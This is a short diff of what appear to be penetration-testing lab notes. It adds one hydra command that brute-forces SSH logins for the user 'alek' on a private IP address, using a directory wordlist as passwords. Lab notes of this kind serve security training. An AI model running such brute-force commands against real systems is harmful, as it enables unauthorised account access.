@@ -154,4 +154,5 @@ No success
 
 # Try brute forcing SSH with username alek
 
+hydra -l alek -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ssh://192.168.64.137 -V
 
